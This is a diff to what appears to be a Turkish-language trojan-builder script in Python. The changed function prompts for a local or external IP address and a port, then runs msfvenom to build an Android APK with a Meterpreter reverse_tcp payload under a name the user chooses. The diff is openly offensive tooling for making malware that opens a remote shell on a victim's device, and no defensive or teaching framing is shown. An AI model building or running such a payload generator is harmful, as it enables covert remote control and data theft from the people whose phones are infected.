@@ -20,7 +20,9 @@ def windowsTrojanOluşturma():
 def androidTrojanOluşturma():
     print("""Android Trojan Oluşturma Programına Hoş Geldiniz""")
     trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
-    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port  -f apk > {trojan}.apk")
+    ip = input("Lüttfen Yerel Veya Dış İp Adresinizi Giriniz:")
+    port = input("Lütfen Portunuzu Giriniz:")
+    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port}  -f apk > {trojan}.apk")
 
 
 if seçim == "1":
